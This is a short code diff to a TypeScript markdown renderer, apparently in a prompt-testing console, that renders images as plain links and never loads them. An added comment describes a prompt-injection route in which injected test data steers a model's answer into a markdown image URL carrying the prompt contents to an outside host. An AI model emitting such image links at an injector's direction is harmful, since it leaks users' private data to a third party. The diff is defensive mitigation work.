@@ -8,8 +8,17 @@ export type MarkdownMode = 'markdown' | 'plain'
 
 // A link in a preview must never navigate the console itself away from an
 // unsaved prompt draft.
+//
+// An image is shown as a link, never loaded: a model answer can be steered by
+// injected TestBench data into `![](https://host/?d=<prompt contents>)`, and
+// rendering it as <img> would send that to the host the moment it appears.
 const COMPONENTS: Components = {
   a: ({ node: _node, ...props }) => <a {...props} target="_blank" rel="noopener noreferrer" />,
+  img: ({ src, alt }) => (
+    <a href={typeof src === 'string' ? src : undefined} target="_blank" rel="noopener noreferrer">
+      {`[${alt || 'image'}]`}
+    </a>
+  ),
 }
 
 /**
